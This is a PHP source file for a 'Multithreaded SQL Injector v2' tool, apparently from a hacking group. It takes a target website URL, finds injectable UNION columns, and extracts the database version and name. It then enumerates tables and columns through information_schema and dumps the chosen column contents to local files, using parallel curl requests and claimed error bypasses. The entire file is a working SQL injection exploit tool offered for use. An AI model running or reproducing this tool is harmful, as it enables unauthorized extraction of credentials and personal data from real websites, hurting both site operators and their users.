<?php
/*************************************************************************
                . __                      .__                          
           _____ |__|___.__._____    ____ |  |__  __ __  ____    ____  
          /     \|  <   |  |\__  \ _/ ___\|  |  \|  |  \/    \  / ___\ 
         |  Y Y  \  |\___  | / __ \\  \___|   Y  \  |  /   |  \/ /_/  >
         |__|_|  /__|/ ____|(____  /\___  >___|  /____/|___|  /\___  / 
               \/    \/          \/     \/     \/           \//_____/  
--------------------------------------------------------------------------
* 		Multithreaded SQL Injector v2
* 		Coded by Miyachung
* 		Skype : live:miyachung
*		Yahoo : miyachung_x
*		ICQ   : 688929857
*
*
*	    [+] New -> Column counter 
*		[+] New -> Bad requests,illegal mix etc bypass 
*		[+] New -> Threading updated
***************************************************************************/
set_time_limit(0);

if(!is_dir("dumps")){mkdir("dumps");}

echo "[+]Enter website: ";
$site					  = fgets(STDIN);
$site					  = str_replace("\r\n","",$site);
$site					  = trim($site);
if(!$site) exit("\n[-]Where is the website!");
if(!preg_match('#http#',$site)) $site = "http://".$site;
$count = counter($site);

if($count != false)
{
$colons   = $count[0];
$effected = $count[1];
}else{exit("\n[-]Could not find the colum number");}
echo "[+]Advanced SQL Injecter\n";
echo "[+]Coded by Miyachung || Janissaries.Org\n";
$version_url		      =	__make_SQL_URL($site,$colons,$effected,FALSE,TRUE,"",__hexEncode("<v3rsion>"),__hexEncode("</v3rsion>"),"version()");
$version_page			  = fetch($version_url);
if(preg_match("#Illegal mix of collations for operation 'UNION'#si",$version_page))
{
exit("[-]Fail -> Illegal mix of collations for operation 'UNION'\n");
}
elseif(preg_match("#403 Forbidden#si",$version_page))
{
exit("[-]Fail -> 403 Forbidden\n");
}
$version_page			  = __replace($version_page);

if(preg_match('#<v3rsion>#si',$version_page))
{
preg_match("/<v3rsion>(.*?)<\/v3rsion>/si",$version_page,$version);
echo "[+]Version -> ".strip_tags($version[1])."\n";
}
else
{
exit("[-]Version not found\n");
}

$database_url			  = __make_SQL_URL($site,$colons,$effected,FALSE,TRUE,"",__hexEncode("<d4tabase>"),__hexEncode("</d4tabase>"),"database()");
$database_page			  = fetch($database_url);
if(preg_match("#Illegal mix of collations for operation 'UNION'#si",$database_page))
{
exit("[-]Fail -> Illegal mix of collations for operation 'UNION'\n");
}
elseif(preg_match("#403 Forbidden#si",$database_page))
{
exit("[-]Fail -> 403 Forbidden\n");
}
$database_page			  = __replace($database_page);
if(preg_match('#<d4tabase>#si',$database_page))
{
preg_match("/<d4tabase>(.*?)<\/d4tabase>/si",$database_page,$database);
echo "[+]Database -> ".strip_tags($database[1])."\n";
}
else
{
echo "[-]Database not found\n";
}
if(substr($version[1],0,1) == 5)
{
echo "[+]Version >= 5 getting tables,using information_schema.tables\n";
}else{exit("[-]Version < 5 , sorry can't get the tables");}


$table_counturl		  = __make_SQL_URL($site,$colons,$effected,"+from+information%5Fschema.tables+where+table_schema=database()",TRUE,"",__hexEncode("<t4blecount>"),__hexEncode("</t4blecount>"),"count(table_name)");
$table_countpage	  = fetch($table_counturl);
$table_countpage	  = __replace($table_countpage);

preg_match("/<t4blecount>(.*?)<\/t4blecount>/si",$table_countpage,$table_counted);

if($table_counted[1] == null)
{
exit("[-]Tables not found\n");
}
echo "[+]Total tables -> ".$table_counted[1]."\n";

for($xz=0;$xz<$table_counted[1];$xz++)
{
$table_url[]			  = __make_SQL_URL($site,$colons,$effected,"+from+information%5Fschema.tables+where+table_schema=database()",TRUE,$xz,__hexEncode("<t4bles>"),__hexEncode("</t4bles>"),"table_name");
}
$tbls	=	__threading($table_url,5,"/<t4bles>(.*?)<\/t4bles>/si",FALSE,FALSE);
table_again:
$tbls	=	array_values(array_unique(array_filter($tbls)));
if(empty($tbls))
{
exit("[-]Can't get tables\n");
}
foreach($tbls as $tid => $tbl)
{
echo "[$tid]$tbl\n";
}
echo "\n[+]Choose a table for get columns,just type number (exit): ";
$choose 	= fgets(STDIN);
$choose 	= str_replace("\r\n","",$choose);
$choose 	= trim($choose);

if($choose == "exit")
{
exit("\n");
}
$selected   = $tbls[$choose];

$column_counturl	= __make_SQL_URL($site,$colons,$effected,"+from+information%5Fschema.columns+where+table_name=0x".__hexEncode($selected)."",TRUE,"",__hexEncode("<c0lumnscount>"),__hexEncode("</c0lumnscount>"),"count(column_name)");
$column_countpage	= fetch($column_counturl);
$column_countpage	= __replace($column_countpage);

preg_match("/<c0lumnscount>(.*?)<\/c0lumnscount>/si",$column_countpage,$column_counted);

if($column_counted[1] == null || $column_counted[1] == 0)
{
echo "[-]Columns not found\n";
goto table_again;
}
echo "[+]Total columns for $selected -> ".$column_counted[1]."\n";

for($xc=0;$xc<$column_counted[1];$xc++)
{
$column_url[] 		= __make_SQL_URL($site,$colons,$effected,"+from+information%5Fschema.columns+where+table_name=0x".__hexEncode($selected)."",TRUE,$xc,__hexEncode("<c0lumns>"),__hexEncode("</c0lumns>"),"column_name");
}
$cols = __threading($column_url,5,"/<c0lumns>(.*?)<\/c0lumns>/si",FALSE,FALSE);
col_showagain:
echo "\n";
$cols = array_values(array_unique(array_filter($cols)));
	foreach($cols as $cid => $colname)
	{
		echo "[$cid]$colname\n";
	}

what_again:
echo "\n[+]What do you wanna do (dump,back,exit): ";
$whatdo = fgets(STDIN);
$whatdo = str_replace("\r\n","",$whatdo);
$whatdo = trim($whatdo);

if($whatdo == "dump")
{
col_ask:
echo "[+]Select dump column 1,just type number(back,exit): ";
$select_col1 = fgets(STDIN);
$select_col1 = str_replace("\r\n","",$select_col1);
$select_col1 = trim($select_col1);
if($select_col1 == "back")
{
goto col_showagain;
}
elseif($select_col1 == "exit")
{
exit("\n");
}

echo "[+]Select dump column 2,type number(if you don't want just enter,back,exit): ";
$select_col2 = fgets(STDIN);
$select_col2 = str_replace("\r\n","",$select_col2);
$select_col2 = trim($select_col2);
if($select_col2 == "back")
{
goto col_ask;
}
elseif($select_col2 == "exit")
{
exit("\n");
}
elseif(!empty($select_col2))
{
$column2 	= $cols[$select_col2];
}
$column1 	= $cols[$select_col1];

$count_url  = __make_SQL_URL($site,$colons,$effected,"+from+$selected",TRUE,"",__hexEncode("<miyacount>"),__hexEncode("</miyacount>"),"count($column1)");
$count_page = fetch($count_url);
$count_page	= __replace($count_page);
preg_match("/<miyacount>(.*?)<\/miyacount>/si",$count_page,$datacount);
if(trim($datacount[1]) == null || $datacount[1] == 0)
{
echo "[-]Columns empty\n";
goto col_showagain;
}
echo "[+]Total datas -> ".$datacount[1]."\n";
echo "[+]Using LIMIT NULL,1 for dump\n\n";
for($x=0;$x<=$datacount[1];$x++)
{

if($column2)
{
$dump_url[] 		= __make_SQL_URL($site,$colons,$effected,"+from+$selected",TRUE,$x,__hexEncode("<dumped>"),__hexEncode("</dumped>"),"$column1,0x3a,$column2");
$filename			= "dumps/".__parse($site).",$column1"."_"."$column2.txt";
}
else
{
$dump_url[] 		= __make_SQL_URL($site,$colons,$effected,"+from+$selected",TRUE,$x,__hexEncode("<dumped>"),__hexEncode("</dumped>"),"$column1");
$filename			= "dumps/".__parse($site).",$column1.txt";
}

}
if($datacount[1] >= 20)
{
$dumps	=	__threading($dump_url,5,"/<dumped>(.*?)<\/dumped>/si",TRUE,TRUE,$filename);
}
else
{
$dumps	=	__threading($dump_url,5,"/<dumped>(.*?)<\/dumped>/si",TRUE,FALSE,"");
}
unset($column_url);
unset($dump_url);
goto col_showagain;
}
elseif($whatdo == "back")
{
unset($column_url);
unset($cols);
goto table_again;
}
elseif($whatdo == "exit")
{
exit("\n");
}
else
{
echo "[-]Unknown command\n";
goto what_again;
}



function fetch($url)
{
$curl 	= curl_init();
curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);
curl_setopt($curl,CURLOPT_URL,$url);
curl_setopt($curl,CURLOPT_USERAGENT,"Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25");
curl_setopt($curl,CURLOPT_TIMEOUT,10);
curl_setopt($curl,CURLOPT_SSL_VERIFYPEER,0);
curl_setopt($curl,CURLOPT_SSL_VERIFYHOST,0);
curl_setopt($curl,CURLOPT_FOLLOWLOCATION,1);
$oba	= curl_exec($curl);
return $oba;
}
function __make_SQL_URL($site,$colons,$effected,$from,$concat,$limit,$hex1,$hex2,$what)
{
$colon_union 			  = range(1,$colons);
if($concat)
{
$colon_union[$effected-1] = "convert(concat(0x$hex1,$what,0x$hex2)+using+latin1)";
}
else
{
$colon_union[$effected-1] = "convert(group_concat(0x$hex1,$what,0x$hex2)+using+latin1)";
}
$colon_union 			  = implode(",",$colon_union);

if($from)
{

if($limit != null)
{
$url					  = $site."+and+1=0+union+select+".$colon_union.$from."+limit+$limit,1--";
}else
{
$url					  = $site."+and+1=0+union+select+".$colon_union.$from."--";
}

}else{

if($limit != null)
{
$url					  = $site."+and+1=0+union+select+".$colon_union."+limit+$limit,1--";
}
$url					  = $site."+and+1=0+union+select+".$colon_union."--";
}
return $url;
}
function __threading($urls,$thread,$regex,$yaz,$kaydet,$file=NULL)
{
$init = curl_multi_init();
$urls = array_chunk($urls,$thread);
$x = 0;
foreach($urls as $url)
{
	for($i=0;$i<=count($url)-1;$i++)
	{
	$curl[$i] = curl_init();
	curl_setopt($curl[$i],CURLOPT_RETURNTRANSFER,1);
	curl_setopt($curl[$i],CURLOPT_URL,$url[$i]);
	curl_setopt($curl[$i],CURLOPT_USERAGENT,"Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25");
	curl_setopt($curl[$i],CURLOPT_TIMEOUT,7);
	curl_setopt($curl[$i],CURLOPT_SSL_VERIFYHOST,0);
	curl_setopt($curl[$i],CURLOPT_SSL_VERIFYPEER,0);
	curl_setopt($curl[$i],CURLOPT_FOLLOWLOCATION,1);
	curl_multi_add_handle($init,$curl[$i]);
	}
	
	do{curl_multi_exec($init,$active);usleep(11);}while($active>0);
	
	foreach($curl as $cid => $page)
	{
	$content[$cid] = curl_multi_getcontent($page);
	curl_multi_remove_handle($init,$page);
	preg_match($regex,$content[$cid],$veri);
	if($yaz == TRUE)
	{
		
		if(!empty($veri[1]))
		{
		$x++;
		echo "[$x]$veri[1]\n";
		ob_flush();flush();
			if($kaydet == TRUE && $file != NULL)
			{
			$fopen = fopen($file,'ab');
			fwrite($fopen,trim($veri[1])."\r\n");
			fclose($fopen);
			}
		}
	}
	else
	{
	$veriler[] = $veri[1];
	}
	
	}
}
return $veriler;
}
function __hexEncode($string)
{
   $hex='';
    for ($i=0; $i < strlen($string); $i++)
    {
        $hex .= dechex(ord($string[$i]));
    }
    return $hex;
}
function __replace($text)
{
$text			  = str_replace("&lt;","<",$text);
$text			  = str_replace("&gt;",">",$text);
return $text;
}
function __dumpsave($file,$text)
{
$fp = fopen($file,'ab');
fwrite($fp,$text);
fclose($fp);
return true;
}
function __parse($site)
{
$site = explode("/",$site);
$site = $site[2];
return $site;
}
function counter($site)
{
$site = $site.'+and+1=0+union+select+';
$ek	  =	'convert(concat(0x3c6275727461793e,1,0x3c2f6275727461793e)+using+latin1)';		
echo "Counting columns.. ->";
echo "1...";
for( $i=2 ; $i<=100 ; $i++ )
{				
$code	=	'convert(concat(0x3c6275727461793e,'.$i.',0x3c2f6275727461793e)+using+latin1)';				
$url	=	$site.$ek;
echo $i."...";
$kaynak	=	curlget($url);
	if(preg_match_all('#<burtay>(.*?)</burtay>#si',$kaynak,$kolon))
	{						
		echo "\n[+]Found column number -> ".($i-1)."\n";
		$effect		=	array_unique($kolon[1]);
		sort($effect);
		$random     = $effect[array_rand($effect)];
		echo "[+]Effected column -> ".$random."\n";
		return array($i-1,$random);
	}
$ek		=	$ek.','.$code;				
}
return false;
}
function curlget($site,$cookie=null)
{
$curl = curl_init();
curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);
curl_setopt($curl,CURLOPT_URL,$site);
if($cookie != null)
{
curl_setopt($curl,CURLOPT_COOKIEJAR,$cookie);
curl_setopt($curl,CURLOPT_COOKIEFILE,$cookie);
}
curl_setopt($curl,CURLOPT_TIMEOUT,6);
curl_setopt($curl,CURLOPT_CONNECTTIMEOUT,6);
curl_setopt($curl,CURLOPT_FOLLOWLOCATION,1);
curl_setopt($curl,CURLOPT_SSL_VERIFYPEER,0);
curl_setopt($curl,CURLOPT_SSL_VERIFYHOST,0);
curl_setopt($curl,CURLOPT_USERAGENT,"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0");
$exec = curl_exec($curl);
curl_close($curl);
return $exec;
}
?>